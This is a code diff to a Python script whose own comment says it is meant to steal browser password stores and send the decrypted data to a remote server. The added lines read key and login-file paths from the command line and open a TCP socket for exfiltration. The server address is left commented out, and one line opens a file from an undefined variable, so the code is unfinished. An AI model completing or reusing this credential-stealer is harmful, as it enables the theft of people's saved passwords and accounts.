@@ -5,6 +5,7 @@
 ## The intent of this program is to steal browser password stores and copy the decrypted data to a remote server.
 
 import argparse
+import socket
 import sys
 import os
 
@@ -19,3 +20,18 @@ def grab_ComandLine(): # Function to grab command line arguments.
     
     return keyFilePath, loginsFilePath
 
+
+
+
+# Main Function
+if __name__ == '__main__':
+    # Initilizes the key and logins path from the provided command line arguments.
+    keyFilePath, loginsFilePath = grab_ComandLine()
+    
+    # Next a socket is established that will be used for sending contents to a remote server
+    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    # Need to spin up a test environment for this.
+    # serverAddress = (IP, Port)
+    # Open a file for logging purposes
+    log = open(log,"w")
+    
